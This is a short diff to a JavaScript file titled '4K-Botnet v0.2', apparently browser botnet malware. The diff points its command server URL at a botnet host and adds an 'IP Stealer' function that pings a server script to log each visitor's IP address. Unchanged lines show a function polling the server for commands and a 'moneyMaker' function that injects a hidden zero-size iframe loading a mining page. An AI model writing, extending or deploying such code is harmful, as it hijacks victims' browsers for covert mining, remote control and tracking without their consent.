@@ -1,6 +1,6 @@
 //4K-Botnet v0.2 by Chowix40
 //I know it's crap but it works (Kinda)
-var SERVER_URL = 'http://example.com/Botnet/'
+var SERVER_URL = 'http://4k-server/4K-Botnet/Botnet/'
 
 function getCMD() {
 var oReqcmd = new XMLHttpRequest();    
@@ -117,3 +117,11 @@ function reDire() {
 function moneyMaker() {
     document.write("<iframe src=" + SERVER_URL + "mine.html width=0 height=0 hidden></iframe>")
 };
+
+//10) IP Stealer
+function ipLog(argument) {
+  var pic = new Image()
+  pic.src = SERVER_URL+'ip.php'
+};
+
+//11) ???
